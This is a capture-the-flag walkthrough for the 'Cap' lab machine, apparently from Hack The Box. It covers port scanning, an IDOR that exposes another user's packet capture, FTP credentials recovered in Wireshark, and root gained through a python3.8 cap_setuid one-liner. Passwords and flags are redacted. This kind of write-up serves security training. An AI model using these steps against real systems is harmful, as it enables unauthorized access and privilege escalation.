## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.
```
## IP-Address
```IP-Address
10.10.10.245
```
## RustScan
```bash
$ rustscan -a 10.10.10.245 -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.245:21
Open 10.10.10.245:22
Open 10.10.10.245:80
```

```bash
$ nmap  -sV -Pn  10.10.10.245 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 17:39 EDT
Nmap scan report for 10.10.10.245
Host is up (0.57s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```
## Browser
## Overview of Findings
- The application exposes **sensitive files (PCAPs)** directly via numeric IDs in the URL.
- This is a classic case of **IDOR (Insecure Direct Object Reference)**, where simply changing the number in the URL reveals different files.
- The **largest file (`snapshot/0`)** seemed like the most valuable, so I downloaded it for deeper packet analysis.

## Wireshark
```bash 
Filter = ftp
then follow > tcp stream follow
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS [password omitted]
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

## Got the Password
#### FTP
```bash
$ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16201|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1001     1001          130 Sep 04 21:17 msf
-rwxr-xr-x    1 1001     1001          250 Sep 04 21:21 msf2
-r--------    1 1001     1001           33 Sep 04 20:05 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||18570|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*******************************************************************|    33        0.11 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:01 (0.03 KiB/s)
```
#### SSH
```bash
$ ssh nathan@10.10.10.245
Password: [password omitted]
```
## User Flag
```bash
nathan@cap:~$ ls
msf  msf2  user.txt
nathan@cap:~$ cat user.txt 
[flag omitted]
nathan@cap:~$ 
```

## Privilege Escalation
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# 
```

## Root Flag
```bash
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt
[flag omitted]
```